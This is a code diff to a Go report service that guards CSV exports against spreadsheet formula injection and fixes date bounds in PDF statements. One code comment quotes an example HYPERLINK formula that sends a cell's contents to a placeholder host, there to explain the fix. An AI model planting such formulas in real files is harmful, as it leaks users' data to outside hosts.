@@ -75,10 +75,10 @@ func (s *ReportService) TransactionsCSV(orgID uuid.UUID, f dto.TransactionFilter
 		}
 		record := []string{
 			t.Date.Format("2006-01-02"),
-			t.Description,
+			csvSafe(t.Description),
 			translateType(t.Type),
-			category,
-			account,
+			csvSafe(category),
+			csvSafe(account),
 			reais(t.Amount),
 			boolPT(t.Paid),
 		}
@@ -88,6 +88,18 @@ func (s *ReportService) TransactionsCSV(orgID uuid.UUID, f dto.TransactionFilter
 	}
 	cw.Flush()
 	return cw.Error()
+}
+
+// csvSafe neutralises spreadsheet formulas in free text. Descriptions come
+// from bank statements (an OFX NAME/MEMO, the name on a PIX) or from other
+// members, and a cell such as =HYPERLINK("http://x/?"&A1;"clique") runs when
+// the CSV is opened in Excel or LibreOffice. A leading apostrophe makes it
+// plain text (OWASP "CSV injection").
+func csvSafe(v string) string {
+	if v != "" && strings.ContainsRune("=+-@\t\r", rune(v[0])) {
+		return "'" + v
+	}
+	return v
 }
 
 // reais converts cents to a "1234,56" string (comma decimal separator).
@@ -154,6 +166,12 @@ func (s *ReportService) Summary(orgID uuid.UUID, from, to *time.Time) (*dto.Repo
 		ByMonth:    byMonth,
 	}, nil
 }
+
+// lastInstant turns an exclusive end (the 1st of next month, as monthRange
+// returns) into the inclusive bound ListAllFiltered expects (date <= To).
+// Passed as is, the statement and the monthly PDF also listed the
+// transactions dated on the 1st of the following month.
+func lastInstant(exclusiveEnd time.Time) time.Time { return exclusiveEnd.Add(-time.Nanosecond) }
 
 // resolveRange applies the "current month" default when either bound is missing.
 // The end bound is treated as exclusive by the repo queries (date < end), so a
@@ -307,6 +325,9 @@ func (s *ReportService) payableRows(orgID uuid.UUID, txType entities.Transaction
 // bounds are nil the current calendar month is used.
 func (s *ReportService) StatementPDF(orgID uuid.UUID, from, to *time.Time, w io.Writer) error {
 	start, end := resolveRange(from, to)
+	if from == nil || to == nil {
+		end = lastInstant(end)
+	}
 
 	f := dto.TransactionFilter{From: &start, To: &end}
 	rows, err := s.txs.ListAllFiltered(orgID, f)
@@ -388,7 +409,8 @@ func (s *ReportService) MonthlyPDF(orgID uuid.UUID, month, year int, w io.Writer
 	}
 
 	// Paid bills (settled expenses) within the month.
-	paidFilter := dto.TransactionFilter{Type: string(entities.TxExpense), From: &start, To: &end}
+	ate := lastInstant(end)
+	paidFilter := dto.TransactionFilter{Type: string(entities.TxExpense), From: &start, To: &ate}
 	paidRows, err := s.txs.ListAllFiltered(orgID, paidFilter)
 	if err != nil {
 		return err
